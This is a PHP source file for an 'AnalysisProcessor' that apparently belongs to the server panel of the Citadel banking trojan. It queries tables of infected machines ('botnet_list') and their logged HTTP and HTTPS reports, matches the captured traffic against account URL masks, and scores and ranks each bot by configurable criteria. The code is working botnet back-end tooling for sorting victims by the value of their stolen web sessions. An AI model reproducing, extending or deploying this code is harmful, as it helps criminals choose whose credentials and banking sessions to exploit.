<?php namespace lib\fun\NeuroStat;

require_once __DIR__.'/../../report.php';

use Amiss\Manager;
use Citadel\Models;
use lib\fun\NeuroStat\Criteria\AReportCriterion;
use lib\helper;

require_once __DIR__.'/adata.php';
require_once __DIR__.'/logger.php';
require_once __DIR__.'/criteria.php';
require_once __DIR__.'/../../helper/Progress.php';






/** Analysis progress object
 * This object is persisted into NeurostatAnalysis::$state
 */
class AnalysisProgress extends helper\LambdaProgress {
}



/** Analysis processor: performs an analysis
 */
class AnalysisProcessor {
    /** The analysis object to work with
     * @var Models\NeurostatAnalysis
     */
    protected $analysis;

    /** The HTML logger
     * @var Logger\AnalysisLogger
     */
    public $_logger;

    /** The collected data
     * @var AData\AnalysisData
     */
    public $data;

    const DEBUG = false;

    const STATE_UPDATE_INTERVAL = 30;
    const STATE_ALIVE_THRESHOLD = 120;

    const STATE_ACTION_PREPARE          = 0;
    const STATE_ACTION_COLLECT_BOTS     = 1;
    const STATE_ACTION_ANALYZE_BOTS     = 2;
    const STATE_ACTION_ANALYZE_REPORTS  = 3;
    const STATE_ACTION_RANK_BOTS        = 4;

    function __construct(Models\NeurostatAnalysis $analysis){
        $this->analysis = $analysis;
    }

    /** DB connection
     * @var \dbPDO
     */
    protected $db;

    /** Amiss Entity Manager
     * @var Manager
     */
    protected $man;

    /** Initialize the processor
     * @param \dbPDO $db
     * @param Manager $man
     */
    function init(\dbPDO $db, Manager $man, $use_logger = false){
        $self = $this;

        # DB
        $this->db = $db;
        $this->man = $man;

        # Logger
        if (static::DEBUG || $use_logger){
            $this->_logger = new Logger\AnalysisLogger($this->db);
            $this->_logger->init($this->analysis);
        }

        # Data
        $this->data = new AData\AnalysisData($this->analysis);

        # State
        $analysis = $this->analysis;
        $analysis->state = new AnalysisProgress(
            static::STATE_UPDATE_INTERVAL,
            static::STATE_ALIVE_THRESHOLD,
            true
        );
        $analysis->state->setUpdateCallback(
            function()use($man, $analysis){
                #echo $analysis->state->toHtml();
                $man->save($analysis);
            }
        );
        $analysis->state->setActions(array(
            static::STATE_ACTION_COLLECT_BOTS => 'Collect bots',
            static::STATE_ACTION_ANALYZE_BOTS => 'Analyze bots',
            static::STATE_ACTION_ANALYZE_REPORTS => 'Analyze reports',
            static::STATE_ACTION_RANK_BOTS => 'Rank',
        ));

        return $this;
    }

    /** The list of criteria models
     * @var Models\NeurostatCriterion[]
     */
    protected $criteria_info;

    /** The list of criteria processors
     * @var Criteria\ACriterion[]
     */
    protected $criteria;

    /** The list of `botnet_reports_%` tables to process
     * @var string[] array( yymmdd => botnet_reports_% )
     */
    protected $report_tables = array();

    /** Initial report id for each `botnet_reports_%` table in $report_tables
     * @var (int|null)[] array( yymmdd => report-id-limit )
     */
    protected $report_tables_min_id = array();

    /** The number of rows for each `botnet_reports_%` table
     * @var int[]
     */
    protected $report_tables_rows = array();

    /** The number of bots to be analyzed
     * @var int
     */
    protected $bots_count = 0;

    /** Load all the necessary entities
     */
    function load(){
        # Criteria
        foreach ($this->analysis->profiles($this->man) as $profile)
            foreach ($profile->criteria($this->man) as $criterion){
                $this->criteria_info[ $criterion->cid ] = $criterion;
                $this->criteria[ $criterion->cid ] = $criterion->getCriterion($this->man);
            }

        # Report tables
        $this->report_tables = $this->db->report_tables();
        $this->report_tables_min_id = array_fill_keys( array_keys($this->report_tables), null );
        foreach ($this->report_tables as $yymmdd => $table)
            $this->report_tables_rows[$yymmdd] = $this->db->query("SELECT COUNT(*) FROM `{$table}`;")->fetchColumn(0);

        # Update the object
        $this->analysis->launched = new \DateTime();

        return $this;
    }

    /** Prepare all the necessary info
     */
    function prepare(){
        # $this: report_tables, report_tables_min_id
        $this->_prepare_report_tables($this->analysis->days, $this->analysis->report_last);
        if ($this->_logger)
            $this->_logger->_prepare_report_tables($this->report_tables, $this->report_tables_min_id);

        # Bots: filter with account
        $new_bots_count = $this->_prepare_bots_by_account($this->analysis->aid, $this->analysis->account);
        if ($this->_logger)
            $this->_logger->_prepare_bots_by_account($this->analysis->aid, $new_bots_count);
        $this->bots_count = $this->db->query(
            'SELECT COUNT(*) FROM `neurostat_analysis_bots` WHERE `aid`=:aid;', array(
            ':aid' => $this->analysis->aid
        ))->fetchColumn(0);
    }

    /** Prepare $report_tables and $report_tables_id based on:
     * * The `days` analysis limit
     * * The last parsed report reference
     * @param int|null $days The number of days to limit the analysis to
     * @param string|null $report_last The last analyzed report: 'yymmdd:report-id'
     */
    protected function _prepare_report_tables($days, $report_last = null){
        list($report_last_yymmdd, $report_last_id) =
            is_null($report_last)
                ? array(0, 0)
                : $report_last
        ;

        # Prepare the data
        $report_tables = $this->report_tables;
        $this->report_tables = array();
        $this->report_tables_min_id = array();

        # Go through the tables & build the condition
        $dayslimit = is_null($days)? 999999 : date('ymd', time() - $days*60*60*24);
        $today = $this->analysis->notoday? date('ymd') : null;
        foreach ($report_tables as $yymmdd => $tableName)
            if ($yymmdd === $today) # notoday support
                continue;
            elseif ($yymmdd < $dayslimit)
                continue;
            elseif ($yymmdd >= $report_last_yymmdd){
                $this->report_tables[$yymmdd] = $tableName;
                $this->report_tables_min_id[$yymmdd] = ($yymmdd == $report_last_yymmdd)? (int)$report_last_id : 0;
            }
    }

    /** Restrict the processing to bots that match the URL mask condition
     * NOTE: Running this method is a MUST. Analyzer won't run otherwise!
     * @param int $analysis_id NeurostatAnalysis::$aid
     * @param array $account NeurostatAnalysis::$account
     * @return int The number of new bots found
     */
    protected function _prepare_bots_by_account($analysis_id, $account){
        $this->analysis->state->setAction(static::STATE_ACTION_COLLECT_BOTS, count($this->report_tables));

        # Single bot analysis
        if (!is_null($this->analysis->single_botid)){
            $q = $this->db->query(
                'INSERT IGNORE INTO `neurostat_analysis_bots`
                 SET `aid` = :aid, `botId` = :botId
                ;', array(
                    ':aid' => $analysis_id,
                    ':botId' => $this->analysis->single_botid,
                ));
            return $q->rowCount();
        }

        # Common
        $q_data = array(
            ':aid' => $analysis_id,
            ':rtime_last' => is_null($this->analysis->botonline)? null : ( time() - 60*60*24*$this->analysis->botonline ),
        );

        # No mask restriction: process all bots
        if (empty($account['urls'])){
            $q = $this->db->query(
                'INSERT IGNORE INTO `neurostat_analysis_bots`
                 (`aid`, `botId`)
                 SELECT :aid, `bot_id`
                 FROM `botnet_list`
                 WHERE
                    (:rtime_last IS NULL OR `rtime_last` >= :rtime_last)
                ;', $q_data
            );
            return $q->rowCount();
        }

        # Create a temporary table to store the matches
        $this->db->query(
            'CREATE TEMPORARY TABLE `_nab_bots` (
                `aid` INT UNSIGNED NOT NULL,
                `botId` VARCHAR(255) NOT NULL,
                `report` VARCHAR(32),
                `account_id` INT UNSIGNED NOT NULL,
                INDEX(`aid`,`botId`),
                INDEX(`report`)
            );'
        );

        # Account matcher
        $new_bots_count = 0;
        $q_data += array(
            ':yymmdd' => '120131',
            ':id_min' => 0,
            ':type_http' => BLT_HTTP_REQUEST,
            ':type_https' => BLT_HTTPS_REQUEST,
        );

        $progress = 0;
        foreach (array_reverse($this->report_tables, true) as $yymmdd => $table){
            $this->analysis->state->setCurrentProgress($progress++);

            # Prepare query data
            $q_data[':yymmdd'] = $yymmdd;
            $q_data[':id_min'] = $this->report_tables_min_id[$yymmdd];

            # Prepare the regexps for each account
            $account_fields = array('NULL'); # Account field definitions: either NULL or account id
            $account_conditions = array('0=0'); # Row conditions
            if (!empty($account['urls']))
                foreach ($account['urls'] as $i => $url){
                    $regexp = '^'.wildcart_body($url);
                    $ph_name = "account_match_{$i}";
                    $q_data[":$ph_name"] = $regexp;

                    $account_conditions[] = "`r`.`path_source` REGEXP BINARY :$ph_name";
                    $account_fields[] = "IF(`r`.`path_source` REGEXP BINARY :$ph_name, $i, NULL)";
                }
            $account_sql_where = implode(' OR ', $account_conditions);
            $account_sql_field = 'COALESCE('.implode(' , ', $account_fields).')';

            # List bots that match the criteria
            if (is_null($q_data[':rtime_last'])){
                $bl_join = '';
                $bl_where = ':rtime_last IS NULL'; # just to use the placeholder
            } else {
                $bl_join = 'LEFT JOIN `botnet_list` `bl` ON(`r`.`bot_id` = `bl`.`bot_id`)';
                $bl_where = '(:rtime_last IS NULL OR `bl`.`rtime_last` >= :rtime_last)';
            }

            # Match bots
            $q = $this->db->query(
                "INSERT INTO `_nab_bots`
                 SELECT
                    :aid,
                    `r`.`bot_id`,
                    CONCAT_WS(':', :yymmdd, `r`.`id`) AS `report`,
                    {$account_sql_field} AS `account_id`
                 FROM `{$table}` `r`
                    {$bl_join}
                 WHERE
                    `r`.`id` > :id_min AND
                    `r`.`type` IN (:type_http, :type_https) AND
                    `r`.`bot_id` NOT IN(SELECT `botId` FROM `neurostat_analysis_bots` WHERE `aid`=:aid) AND
                    {$bl_where} AND
                    ({$account_sql_where})
                 GROUP BY `r`.`bot_id`
                 ;",
                $q_data
            );
            $new_bots_count += $q->rowCount();
        }

        # Load all bots for which we have updated data. Also, provide stubs for new bots to be added
        $q = $this->db->query(
            'SELECT
                `n`.`aid`,
                `n`.`botId`,
                `nab`.`bid`,
                `nab`.`accounts`
             FROM `_nab_bots` `n`
                LEFT JOIN `neurostat_analysis_bots` `nab` USING(`aid`,`botId`)
             GROUP BY `n`.`botId`
             ;'
        );

        $bots = array();
        while ($bot = $q->fetchObject()){
            $bots[$bot->botId] = $bot;
            $bot->accounts = empty($bot->accounts)
                ? array()
                : unserialize($bot->accounts);
        }

        # Process table `_nab_bots` to update the bots
        $q = $this->db->query('SELECT * FROM `_nab_bots` ORDER BY `report` ASC;');
        while ($row = $q->fetchObject()){
            $bot = $bots[$row->botId];
            $account_mask = $account['urls'][  $row->account_id  ];
            $bot->accounts[$account_mask] = $row->report;
        }

        # Finally, update the bots
        $stmt = $this->db->prepare(
            'INSERT INTO `neurostat_analysis_bots`
             SET
                `aid`=:aid,
                `botId`=:botId, `bid`=:bid,
                `accounts`=:accounts
             ON DUPLICATE KEY UPDATE
                `accounts`=:accounts
             ;'
        );
        $q_data = array(
            ':aid' => $analysis_id,
            ':botId' => null,
            ':bid' => null,
            ':accounts' => null,
        );
        foreach ($bots as $bot){
            $q_data[':botId'] = $bot->botId;
            $q_data[':bid'] = $bot->bid;
            $q_data[':accounts'] = serialize($bot->accounts);
            $stmt->execute($q_data);
        }

    return $new_bots_count;
    }

    /** Analyze bots given in the `neurostat_analysis_bots` table for this analysis,
     * store the collected data into `neurostat_analysis_data`
     */
    function analyzeBots(){
        $this->_analyzeBotsTable_Bots();
        $this->_analyzeBotsTable_Reports();
        return $this;
    }

    /** analyzeBots(): table `botnet_list`, ABotCriterion
     */
    protected function _analyzeBotsTable_Bots(){
        # Pick the correct Criteria
        $criteria = array(); /** @var Criteria\ABotCriterion[] $criteria */
        foreach ($this->criteria as $criterion)
            if ($criterion instanceof Criteria\ABotCriterion)
                $criteria[] = $criterion;

        # Progress, Logging
        $this->analysis->state->setAction(static::STATE_ACTION_ANALYZE_BOTS, $this->bots_count);
        if ($this->_logger)
            $this->_logger->_analyzeBotsTable_Bots_start($this->bots_count, $criteria);

        # Query
        $q = $this->db->query(
            'SELECT `nab`.`bid`, `bl`.*
             FROM `neurostat_analysis_bots` `nab`
                CROSS JOIN `botnet_list` `bl` ON(`bl`.`bot_id` = `nab`.`botId`)
             WHERE
                `nab`.`aid` = :aid
            ;', array(
            ':aid' => $this->analysis->aid
        ));

        # Analyze
        $this->data->setDate(0); # special data for bot analysis
        $progress = 0; # progress tracker
        while ($bot = $q->fetchObject()){ # list bots
            $this->data->setBot($bot->bid);
            $criteria_matches = array(); # Logger: cid => bool

            # Match all criteria
            foreach ($criteria as $criterion){
                $matches = $criterion->match($bot) ^ $criterion->c->negated; # matches, including the negation rule

                # If matched - store
                if ($matches)
                    $this->data
                        ->setCriterion($criterion)
                        ->commit();

                # Log
                if ($this->_logger)
                    $criteria_matches[$criterion->c->cid] = $matches;
            }

            # Progress
            if ($progress++ % 10 == 0)
                $this->analysis->state
                    ->setDoing($bot->bot_id)
                    ->setCurrentProgress($progress);

            # Log
            if ($this->_logger)
                $this->_logger->_analyzeBotsTable_Bots_bot($bot->bot_id, $criteria_matches);
        }

        # Save
        $this->data->save($this->db, $this->man);

        # Log
        if ($this->_logger)
            $this->_logger->_analyzeBotsTable_Bots_finish();
    }

    /** Prepare an SQL query to `botnet_reports_%` which also contains extra fields with precondition flags for each criteria
     * @param int $yymmdd
     * @param string $table
     * @param Criteria\AReportCriterion[] $criteria
     *      The criteria willing to act on reports
     * @param array $criteria_condition_fields
     *      Each criterion adds its own filtering.
     *      This maps the field name of the result set to the criterion which processes the row in case the field is '1'
     * @return \PDOStatement|null
     */
    protected function _botnet_reports_query($yymmdd, $table, $criteria, &$criteria_condition_fields){
        $criteria_condition_fields = array(); # cid => field-name

        # Build precondition query for the criteria
        $reports_table_alias = 'r';
        $select_fields = array(); # SQL select fields for the conditions
        $conditions = array(); # SQL conditions

        # Prepare the mapping and the query parts
        $q_data = array();

        foreach ($criteria as $criterion) /** @var Criteria\AReportCriterion $criterion */
            if ($criterion->checkDaysLimit($yymmdd)){
                $field_name = "cpcf_{$criterion->c->cid}"; # Criterion PreCondition Field
                $placeholder_prefix = "cpcf{$criterion->c->cid}"; # Placeholder prefix

                # Store the mapping
                $criteria_condition_fields[$field_name] = $criterion;

                # Prepare the condition
                list($condition, $condition_q_data) = $criterion->condition($placeholder_prefix, $reports_table_alias);

                # Merge the query data
                if ($condition_q_data)
                    $q_data += $condition_q_data;

                # Add query parts
                $select_fields[] = "{$condition} AS `$field_name`";
                $conditions[] = $condition;
            }

        # No criteria willing to work with this table - skip
        if (empty($criteria_condition_fields))
            return null;

        # Prepare the query
        $select_fields  = implode(' , ', $select_fields?:array('1'));
        $conditions     = implode(' OR ', $conditions?:array('1=1'));

        $q = $this->db->query( $q_str =
            "SELECT
                `nab`.`bid`,
                `{$reports_table_alias}`.*,
                {$select_fields}
             FROM `{$table}` `{$reports_table_alias}`
                CROSS JOIN `neurostat_analysis_bots` `nab` ON(`nab`.`aid` = :aid AND `r`.`bot_id` = `nab`.`botId`)
             WHERE
                `r`.`id` > :min_id AND
                ( {$conditions} )
            ;", $q_data + array(
            ':aid' => $this->analysis->aid,
            ':min_id' => $this->report_tables_min_id[$yymmdd]
        ));

        return $q;
    }

    /** analyzeBots(): tables `botnet_reports_*`, AReportCriterion
     */
    protected function _analyzeBotsTable_Reports(){
        # Pick the correct Criteria
        $criteria = array(); /** @var Criteria\AReportCriterion[] $criteria */
        foreach ($this->criteria as $criterion)
            if ($criterion instanceof Criteria\AReportCriterion)
                $criteria[] = $criterion;

        # Progress, Logging
        $this->analysis->state->setAction(static::STATE_ACTION_ANALYZE_REPORTS, array_sum($this->report_tables_rows));

        $global_progress = 0;
        $inc = 0;
        foreach ($this->report_tables as $yymmdd => $table){
            $this->data->setDate($yymmdd);

            # Progress
            $this->analysis->state
                ->setDoing($table)
                ->setCurrentProgress($global_progress);

            # Prepare the query
            $criteria_condition_fields = array(); /** @var Criteria\AReportCriterion[] $criteria_condition_fields */
            $q = $this->_botnet_reports_query($yymmdd, $table, $criteria, $criteria_condition_fields);
            if (is_null($q))
                continue;

            # Log
            if ($this->_logger)
                $this->_logger->_analyzeBotsTable_Reports_start($table, $criteria_condition_fields);

            # Analyze each report
            while ($report = $q->fetchObject()){
                # Log
                $criteria_matches = array();

                # Match the criteria which want this report
                foreach ($criteria_condition_fields as $field_name => $criterion)
                    if ($report->{$field_name} == 1){ # This criterion said it likes this report
                        # Match
                        $match = $criterion->match($yymmdd, $report->id, $report) ^ $criterion->c->negated;

                        # Store
                        if ($match)
                            $this->data
                                ->setBot($report->bid)
                                ->setCriterion($criterion)
                                ->addReport("{$yymmdd}:{$report->id}")
                                ->commit()
                                ->resetReports();

                        # Log
                        if ($this->_logger)
                            $criteria_matches[$criterion->c->cid] = $match;
                    }

                # First report, last report
                if (empty($this->analysis->report_first))
                    $this->analysis->report_first = array($yymmdd, $report->id);
                $this->analysis->report_last = array($yymmdd, $report->id);

                # Progress
                if ($inc++ %20 == 0)
                    $this->analysis->state
                        ->setDoing("$table:{$report->id}")
                        ->setCurrentProgress($global_progress + $report->id);

                # Log
                if ($this->_logger)
                    $this->_logger->_analyzeBotsTable_Reports_report($yymmdd, $report, $criteria_condition_fields, $criteria_matches);

                # Save
                if ($inc % 10000 == 0){
                    $this->data->save($this->db, $this->man);
                    $this->man->save($this->analysis); # update first_report, last_report
                }
            }

            # Save
            $this->data->save($this->db, $this->man);
            $this->man->save($this->analysis); # update first_report, last_report

            # Log
            if ($this->_logger)
                $this->_logger->_analyzeBotsTable_Reports_finish();

            # Progress
            $global_progress += $this->report_tables_rows[$yymmdd];
        }
    }

    /** Perform bots ranking based on the analysis data gathered into `neurostat_analysis_data`,
     * update `neurostat_analysis_bots`.`points`
     */
    function rankBots(){
        $this->analysis->state->setAction(static::STATE_ACTION_RANK_BOTS, count($this->criteria));

        # Prepare the temp table
        $this->db->query(
            'CREATE TEMPORARY TABLE `_bot_points` (
                `bid`       INT UNSIGNED NOT NULL,
                `cid`       INT UNSIGNED NOT NULL,
                `points`    INT UNSIGNED NOT NULL,
                UNIQUE(`bid`, `cid`)
            );'
        );

        # Aggregate the results
        $progress = 0;
        foreach ($this->criteria as $criterion){
            $this->analysis->state
                ->setCurrentProgress($progress++)
                ->update(true);

            # Query data
            $days_limit = min( $this->analysis->days , $criterion->c->days_limit );
            $q_data = array(
                ':aid' => $this->analysis->aid,
                ':cid' => $criterion->c->cid,
                ':points' => $criterion->c->points,
                ':thr' => $criterion->c->c_threshold,
                ':days' => date('ymd',
                        $days_limit
                        ? time() - $days_limit * 60*60*24
                        : 0
                )
            );

            # Special criterion cases
            if (! $criterion instanceof AReportCriterion)
                $q_data[':days'] = '000000';

            # Query chunks
            $where = 'WHERE `aid`=:aid AND `cid`=:cid AND `date`>=:days';
            $table = '`neurostat_analysis_data`';
            $groupby_week = 'GROUP BY `bid`, YEAR(`date`), WEEK(`date`)';

            $points = 0; # `points` field expression
            $from = "$table $where";
            $op = $criterion->c->c_operator; # threshold comparision operator shortcut

            # Prepare the query
            switch ($criterion->c->c_stat){
                case null:
                    $points = "SUM(`reports_count`) * :points";
                    unset($q_data[':thr']); # not used
                    break;
                case 'sum':
                    $points = "IF(SUM(`reports_count`) {$op} :thr, :points, 0)";
                    break;
                case 'days':
                    $points = "IF(COUNT(*) {$op} :thr, :points, 0)";
                    break;
                case 'avg/day':
                    $points = "IF(AVG(`reports_count`) {$op} :thr, :points, 0)";
                    break;
                case 'sum/week':
                    $points = "IF(SUM(`rc`) {$op} :thr, :points, 0)";
                    $from = "(SELECT `bid`, SUM(`reports_count`) AS `rc` FROM $table $where $groupby_week) `_t`";
                    break;
                case 'avg/week':
                    $points = "IF(AVG(`rc`) {$op} :thr, :points, 0)";
                    $from = "(SELECT `bid`, SUM(`reports_count`) AS `rc` FROM $table $where $groupby_week) `_t`";
                    break;
                case 'days/week':
                    $points = "IF(AVG(`days`) {$op} :thr, :points, 0)";
                    $from = "(SELECT `bid`, COUNT(*) AS `days` FROM $table $where $groupby_week) `_t`";
                    break;
            }

            # Execute the query
            $this->db->query(
                $qs = "INSERT INTO `_bot_points`
                       SELECT `bid`, :cid, {$points} AS `points`
                       FROM $from
                       GROUP BY `bid`
                ;", $q_data
            );
        }

        # Reset the results
        $this->db->query(
            'UPDATE `neurostat_analysis_bots`
             SET `points`=NULL, `details`=NULL
             WHERE `aid`=:aid
            ;', array(
            ':aid' => $this->analysis->aid,
        ));

        # Assign the points by summing-up the points given by each criterion
        $this->db->query(
            'UPDATE `neurostat_analysis_bots` `nab`
             CROSS JOIN (
                SELECT `bid`, SUM(`points`) AS `points`
                FROM `_bot_points` `p`
                GROUP BY `bid`
             ) `t` ON(`nab`.`bid` = `t`.`bid`)
             SET `nab`.`points` = `t`.`points`
             WHERE `aid`=:aid
             ;', array(
            ':aid' => $this->analysis->aid,
        ));

        # Update the details for each criterion
        $upd = $this->db->prepare('UPDATE `neurostat_analysis_bots` SET `details`=:details WHERE `aid`=:aid AND `bid`=:bid;');
        $q_data = array(
            ':aid' => $this->analysis->aid,
            ':bid' => null,
            ':details' => null,
        );
        foreach ($q_data as $k => &$v)
            $upd->bindParam($k, $v);

        $q = $this->db->query('SELECT * FROM `_bot_points` ORDER BY `bid`, `cid` ASC;');
        $bid = null;
        $accum = array();
        do{
            $row = $q->fetchObject();
            if (!$row || $bid != $row->bid){
                # Update
                if (!empty($accum)){
                    $q_data[':bid'] = $bid;
                    $q_data[':details'] = serialize($accum);
                    $upd->execute();
                }

                # Reset
                $accum = array();

                # Finish
                if (!$row) break;
                $bid = $row->bid;
            }

            $accum[$row->cid] = $row->points;
        }while(1);

        return $this;
    }

    /** Perform bots tagging based on the analysis data gathered into `neurostat_analysis_data`,
     * update `botnet_list` with tags assigned to bots meething the tagging criteria
     */
    function tagBots(){ # TODO
        return $this;
    }

    /** Finish processing
     */
    function finish(){
        $this->analysis->state = null;
        $this->man->save($this->analysis);

        if (static::DEBUG)
            echo $this->_logger;
        return $this;
    }
}
